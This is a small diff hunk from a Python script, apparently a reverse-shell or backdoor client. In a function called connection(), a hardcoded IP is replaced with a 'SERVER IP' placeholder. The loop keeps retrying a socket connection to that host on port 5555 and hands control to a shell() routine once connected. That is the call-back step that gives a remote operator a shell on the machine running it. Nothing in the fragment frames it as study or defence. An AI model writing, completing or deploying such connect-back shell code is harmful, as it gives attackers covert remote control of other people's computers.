@@ -445,7 +445,7 @@ def connection():
     while True:
         time.sleep(5)
         try:
-            s.connect(('192.168.0.183', 5555))
+            s.connect(('SERVER IP', 5555))
             shell()
             s.close()
             break
